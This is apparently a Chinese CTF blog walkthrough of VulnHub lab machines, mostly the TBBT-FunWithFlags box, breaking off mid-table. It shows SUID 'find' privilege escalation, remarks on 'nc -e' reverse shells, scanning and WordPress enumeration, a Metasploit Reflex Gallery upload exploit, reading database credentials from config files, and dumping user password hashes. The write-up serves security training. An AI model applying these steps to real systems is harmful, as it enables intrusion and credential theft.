plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure><p>可以通过find命令来进行读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec ls -la &#x2F;root \;</span><br><span class="line"></span><br><span class="line">total 40</span><br><span class="line">drwx------  6 root root 4096 Feb 15 16:28 .</span><br><span class="line">drwxr-xr-x 25 root root 4096 Mar 26 17:07 ..</span><br><span class="line">-rw-------  1 root root   41 Mar 26 17:22 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Jan 30 06:53 .cache</span><br><span class="line">drwx------  5 root root 4096 Jan 30 03:06 .config</span><br><span class="line">drwx------  3 root root 4096 Jan 27 16:46 .gnupg</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jan 27 16:56 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root   97 Jan 30 04:29 flag3.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec cat &#x2F;root&#x2F;flag3.txt \;</span><br><span class="line"></span><br><span class="line">Congrats!!!You completed the challenege!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   ()    ()</span><br><span class="line"></span><br><span class="line"> \      &#x2F;</span><br><span class="line">  ----------</span><br></pre></td></tr></table></figure><p>但是通过find来命令执行时存在限制的，并不是完全以root账户的身份去执行</p><p>在本地测试之后得出如下结论</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure><ul><li>*** 分别代表权限的三位，其中*为通配，表示任意权限</li><li>**2， linux中的权限可以线性叠加，**2即代表需要仅写权限，在**3, **6, **7的情况下也是适用的</li><li>bash意为该文件作为bash的参数来执行(bash <a href="http://run.sh">run.sh</a>)，exec则表示作为可执行程序来执行(./run.sh)</li></ul><p>由此看来应当是继承了root的r-x权限，但是直接获取bash则还是以原用户的身份来获取，并不能获取root权限的bash；也不能通过passwd来修改root账户的密码(即使euid=0)</p><blockquote><p>nc.traditional/nc</p></blockquote><ul><li>nc.traditional是最早的版本(v1.10-41.1)，该版本具有<code>-e</code>的选项，用于反弹shell十分方便</li><li>ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有<code>-e</code>的选项，无法用于反弹shell</li><li>ncat的版本则比较新，集成于nmap中</li></ul><p>参考资料</p><blockquote><p><a href="https://www.runoob.com/linux/linux-shell.html">exec</a><br /><a href="https://www.hacknos.com/haclabs-no_name-walkthrough-vulnhub-ctf/">WP</a><br /><a href="https://www.sqlsec.com/2019/10/nc.html">nc</a></p></blockquote><h1 id="tbbt-funwithflags"><a class="markdownIt-Anchor" href="#tbbt-funwithflags"></a> <a href="https://www.vulnhub.com/entry/tbbt-funwithflags,437/">TBBT-FunWithFlags</a></h1><p><code>2020/03/31 13:24:54</code></p><blockquote><p>靶机未启用DHCP，故使用了默认的静态IP:192.168.1.105。若本机网段不是192.168.1.*，需要在VB中创建一个192.168.1.*网段的Host-Only Ethernet Adapter</p></blockquote><h2 id="端口扫描-14"><a class="markdownIt-Anchor" href="#端口扫描-14"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -A -sV -T5 -n -v 192.168.1.105</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.105</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           539 Mar 04 01:11 Welcome.txt</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           114 Mar 04 01:13 ftp_agreement.txt</span><br><span class="line">|_drwxr-xr-x    9 ftp      ftp          4096 Mar 04 01:09 pub</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.3</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)</span><br><span class="line">|   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)</span><br><span class="line">|_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Fun with flags!</span><br><span class="line">1337&#x2F;tcp open  waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span><br><span class="line">|_    FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port1337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;31%Time&#x3D;5E82D546%P&#x3D;x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GenericLine</span><br><span class="line">SF:s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GetRequest,2</span><br><span class="line">SF:F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(HTTPOptions,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RTSPRequest,2F,&quot;F</span><br><span class="line">SF:LAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RPCCheck,2F,&quot;FLAG-s</span><br><span class="line">SF:heldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSStatusRequestT</span><br><span class="line">SF:CP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Help,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SSLSessionReq,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServerCookie</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TLSSessionReq</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Kerberos,2F,&quot;</span><br><span class="line">SF:FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SMBProgNeg,2F,&quot;FLA</span><br><span class="line">SF:G-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(X11Probe,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(FourOhFourRequest,2F,&quot;FLAG</span><br><span class="line">SF:-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LPDString,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPSearchReq,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPBindReq,2F,&quot;FLAG-sheld</span><br><span class="line">SF:on&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SIPOptions,2F,&quot;FLAG-sheldon&#123;</span><br><span class="line">SF:cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LANDesk-RC,2F,&quot;FLAG-sheldon&#123;cf8</span><br><span class="line">SF:8b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServer,2F,&quot;FLAG-sheldon&#123;cf</span><br><span class="line">SF:88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(NCP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb1</span><br><span class="line">SF:0c4005c1f2781a069cf8&#125;\n&quot;)%r(NotesRPC,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c400</span><br><span class="line">SF:5c1f2781a069cf8&#125;\n&quot;)%r(JavaRMI,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f27</span><br><span class="line">SF:81a069cf8&#125;\n&quot;)%r(WMSRequest,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a</span><br><span class="line">SF:069cf8&#125;\n&quot;)%r(oracle-tns,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069</span><br><span class="line">SF:cf8&#125;\n&quot;)%r(ms-sql-s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\</span><br><span class="line">SF:n&quot;)%r(afp,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(giop</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;);</span><br><span class="line">MAC Address: 08:00:27:F7:18:EC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.012 days (since Tue Mar 31 01:13:02 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>nmap在扫描结果中就给出了FLAG-sheldon<br />实际上使用nc就能获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.105 1337</span><br><span class="line"></span><br><span class="line">FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</code></strong></p><p>nmap在扫描时给出了80端口上<code>robots.txt</code>的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br></pre></td></tr></table></figure><p>测试之后发现只有<code>/howard</code>可以访问</p><h2 id="web路径枚举-14"><a class="markdownIt-Anchor" href="#web路径枚举-14"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.1.105/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.105&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;index.html (CODE:200|SIZE:239)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;javascript&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;phpmyadmin&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;private&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;robots.txt (CODE:200|SIZE:112)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;server-status (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><p>可以看到存在phpmyadmin框架和wordpress框架</p><ul><li>访问<code>/private</code>，看起来像是一个自建的站点</li><li>尝试后发现<code>/private/login.php</code>，可以尝试SQL注入或者收集信息再进行登入爆破</li><li>访问<code>/howard</code></li><li><code>/howard/stolen_data/pennys_lastname.txt</code>中记录内容为<code>ERROR 404</code></li></ul><h2 id="漏洞利用-14"><a class="markdownIt-Anchor" href="#漏洞利用-14"></a> 漏洞利用</h2><p>使用wpscan对wordpress站点进行扫描</p><p><code>wpscan --url http://192.168.1.105/music/wordpress -e u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] footprintsonthemoon</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kripke</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] stuart</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>得到三个账户的用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress -e ap</span><br><span class="line"></span><br><span class="line">[+] reflex-gallery</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;</span><br><span class="line"> | Last Updated: 2019-05-10T16:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.1.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>得到插件信息</p><p>搜索插件相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">searchsploit reflex gallery</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                       |  Path</span><br><span class="line">                                                                     | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) | exploits&#x2F;php&#x2F;remote&#x2F;36809.rb</span><br><span class="line">WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload        | exploits&#x2F;php&#x2F;webapps&#x2F;36374.txt</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>在MSF中搜索相关EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search reflex</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability</span><br></pre></td></tr></table></figure><p>使用EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload</span><br><span class="line">set RHOSTS 192.168.1.105</span><br><span class="line">set TARGETURI &#x2F;music&#x2F;wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功获取Shell</p><h2 id="权限提升-14"><a class="markdownIt-Anchor" href="#权限提升-14"></a> 权限提升</h2><ul><li>FLAG-raz</li></ul><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看wordpress的数据库配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;music&#x2F;wordpress&#x2F;wp-config.php | grep -i db</span><br><span class="line"></span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;footprintsonthemoon1337&#39; );</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure><p>连接数据库<br /><code>mysql -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 footprintsonthemoon</code></p><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+---------------------+</span><br><span class="line">| Database            |</span><br><span class="line">+---------------------+</span><br><span class="line">| information_schema  |</span><br><span class="line">| footprintsonthemoon |</span><br><span class="line">+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>退出mysql并导出数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">mysqldump -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 --databases footprintsonthemoon &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;dump.sql</span><br></pre></td></tr></table></figure><p>在Kali中下载备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;dump.sql</span><br></pre></td></tr></table></figure><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat dump.sql | grep &quot;FLAG&quot; --color&#x3D;auto</span><br><span class="line"></span><br><span class="line">FLAG-raz&#123;40d17a74e28a62eac2df19e206f0987c&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里导出的数据在Kali中用grep节选时如果没有用高亮就很难找</p></blockquote><ul><li>FLAG-bernadette</li></ul><p>查看<code>/private</code>站点的数据库配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;private&#x2F;db_config.php | grep -i db</span><br><span class="line"></span><br><span class="line">$DBUSER &#x3D; &#39;bigpharmacorp&#39;;</span><br><span class="line">$DBPASS &#x3D; &#39;weareevil&#39;;</span><br><span class="line">$con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,$DBUSER,$DBPASS,&quot;bigpharmacorp&quot;);</span><br></pre></td></tr></table></figure><p>连接数据库<br /><code>mysql -h localhost -u bigpharmacorp -pweareevil</code></p><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| bigpharmacorp      |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">use bigpharmacorp；</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line">+-------------------------+</span><br><span class="line">| Tables_in_bigpharmacorp |</span><br><span class="line">+-------------------------+</span><br><span class="line">| products                |</span><br><span class="line">| users                   |</span><br><span class="line">+-------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">select * from users;</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">| id | username   | password                         | fname      | description                                       |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">|  1 | admin      | 3fc0a7acf087f549ac2b266baf94b8b1 | josh       | Dont mess with me                                 |</span><br><span class="line">|  2 | bobby      | 8cb1fb4a98b9c43b7ef208d624718778 | bob        | I like playing football.                          |</span><br><span class="line">|  3 | penny69    | cafa13076bb64e7f8bd480060f6b2332 | penny      | Hi I am Penny I am new here!! &lt;3                  |</span><br><span class="line">|  4 | mitsos1981 | 